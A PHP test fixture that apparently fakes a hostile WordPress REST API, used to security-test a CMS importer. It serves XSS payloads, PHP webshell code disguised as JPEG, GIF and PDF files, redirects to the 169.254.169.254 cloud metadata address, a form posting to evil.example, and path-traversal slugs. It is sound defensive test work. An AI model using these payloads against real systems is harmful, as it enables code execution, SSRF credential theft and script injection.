<?php
/**
 * Un WordPress finto e cattivo, per le prove di attacco dell'import (tools/sicurezza-prova.js, punto 18). Solo per le prove.
 *   php -S 127.0.0.1:8073 prove/finto-wp.php
 * Risponde come la REST di WordPress con un articolo pieno di HTML pericoloso, un "JPEG" che e codice PHP, una GIF con PHP
 * in coda, un PDF che e PHP, un'immagine che rimanda all'indirizzo dei metadati del cloud, un file su un altro host. Con
 * /rimanda/ davanti a ogni percorso rimanda a un altro host (per provare che il CMS non lo segue).
 */
$u = (string)parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$q = $_GET;
$base = 'http://' . $_SERVER['HTTP_HOST'];
$json = function ($d, int $codice = 200, array $h = []) { http_response_code($codice); header('Content-Type: application/json; charset=UTF-8'); foreach ($h as $x) header($x); echo json_encode($d, JSON_UNESCAPED_SLASHES); exit; };
if (str_starts_with($u, '/rimanda/')) { header('Location: http://127.0.0.1:8071' . substr($u, 8), true, 302); exit; }
if (str_starts_with($u, '/rimanda-interno/')) { header('Location: http://169.254.169.254/latest/meta-data/', true, 302); exit; }

// I file
$file = [
    '/wp-content/uploads/2026/10/foto.jpg' => ['image/jpeg', "<?php echo 'PHP eseguito'; system(\$_GET['c'] ?? 'id'); ?>"],
    '/wp-content/uploads/2026/10/doppia.gif' => ['image/gif', base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7') . "<?php system('id'); ?>"],
    '/wp-content/uploads/2026/10/listino.pdf' => ['application/pdf', "%PDF-1.4\n<?php system('id'); ?>\n%%EOF"],
    '/wp-content/uploads/2026/10/script.svg' => ['image/svg+xml', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(5)"><script>alert(6)</script><rect width="10" height="10"/></svg>'],
];
if (isset($file[$u])) { header('Content-Type: ' . $file[$u][0]); echo $file[$u][1]; exit; }
if ($u === '/wp-content/uploads/2026/10/metadati.jpg') { header('Location: http://169.254.169.254/latest/meta-data/iam/', true, 302); exit; }

$auth = !empty($_SERVER['HTTP_AUTHORIZATION']) || !empty($_SERVER['PHP_AUTH_USER']);
$rotta = $u === '/wp-json' || $u === '/wp-json/' ? '/' : (str_starts_with($u, '/wp-json/') ? substr($u, 8) : null);
if ($rotta === null) { http_response_code(404); echo 'Non trovato'; exit; }
$elenco = fn(array $l) => $json($l, 200, ['X-WP-Total: ' . count($l), 'X-WP-TotalPages: 1']);
$cattivo = '<p>Testo buono.</p><script>alert(1)</script><img src="x" onerror="alert(2)"><p><a href="javascript:alert(3)">clic</a></p>'
    . '<iframe src="https://evil.example/"></iframe><svg onload="alert(4)"><circle r="5"/></svg><div style="background:url(https://evil.example/x.png)">sfondo</div>'
    . '<form action="https://evil.example/ruba"><input name="p"></form><p onclick="alert(7)">premi</p>'
    . '<figure class="wp-block-image"><img src="' . $base . '/wp-content/uploads/2026/10/foto.jpg" class="wp-image-7" alt=""></figure>'
    . '<p><img src="' . $base . '/wp-content/uploads/2026/10/doppia.gif" alt="gif"><img src="' . $base . '/wp-content/uploads/2026/10/metadati.jpg" alt="meta"><img src="' . $base . '/wp-content/uploads/2026/10/script.svg" alt="svg"></p>'
    . '<p><a href="' . $base . '/wp-content/uploads/2026/10/listino.pdf">listino</a></p><div data-importa-video="youtube-&quot;&gt;&lt;script&gt;"></div>';
switch ($rotta) {
    case '/':
        $json(['name' => 'Finto <script>alert(8)</script>', 'description' => '', 'url' => $base, 'home' => $base, 'namespaces' => ['wp/v2'], 'authentication' => ['application-passwords' => ['endpoints' => []]]]);
    case '/wp/v2/users/me':
        if (!$auth) $json(['code' => 'rest_not_logged_in', 'message' => 'no', 'data' => ['status' => 401]], 401);
        $json(['id' => 1, 'name' => 'Attaccante', 'roles' => ['administrator'], 'capabilities' => ['edit_others_posts' => true]]);
    case '/wp/v2/categories':
        $elenco([['id' => 2, 'name' => '<img src=x onerror=alert(9)>Cattiva', 'slug' => '../../cattiva', 'parent' => 0, 'count' => 1, 'link' => "$base/category/cattiva/", 'description' => '<script>x</script>']]);
    case '/wp/v2/tags': case '/wp/v2/comments': case '/wp/v2/menus': case '/wp/v2/navigation':
        $elenco([]);
    case '/wp/v2/users':
        $elenco([['id' => 1, 'name' => 'Attaccante']]);
    case '/wp/v2/menu-locations': case '/wp/v2/types': case '/wp/v2/settings':
        $json([]);
    case '/wp/v2/pages':
        $elenco([]);
    case '/wp/v2/media':
        $elenco([
            ['id' => 7, 'source_url' => "$base/wp-content/uploads/2026/10/foto.jpg", 'mime_type' => 'image/jpeg', 'media_type' => 'image', 'media_details' => ['filesize' => 60]],
            ['id' => 8, 'source_url' => 'http://127.0.0.1:8071/wp-content/uploads/2026/10/altrove.jpg', 'mime_type' => 'image/jpeg', 'media_type' => 'image', 'media_details' => []],
            ['id' => 9, 'source_url' => "$base/wp-content/uploads/2026/10/doppia.gif", 'mime_type' => 'image/gif', 'media_type' => 'image', 'media_details' => []],
            ['id' => 10, 'source_url' => "$base/wp-content/uploads/2026/10/shell.php", 'mime_type' => 'application/x-php', 'media_type' => 'file', 'media_details' => []],
        ]);
    case '/wp/v2/posts':
        $elenco([['id' => 77, 'type' => 'post', 'slug' => 'articolo-cattivo', 'title' => ['raw' => 'Articolo <script>alert(10)</script> cattivo', 'rendered' => ''], 'status' => 'publish',
            'date' => '2026-01-01T10:00:00', 'date_gmt' => '2026-01-01T09:00:00', 'link' => "$base/articolo-cattivo/", 'parent' => 0, 'author' => 1, 'categories' => [2], 'tags' => [],
            'featured_media' => 7, 'content' => ['raw' => $cattivo, 'rendered' => $cattivo], 'excerpt' => ['raw' => '<script>alert(11)</script>Estratto']]]);
}
$json(['code' => 'rest_no_route', 'message' => 'No route', 'data' => ['status' => 404]], 404);
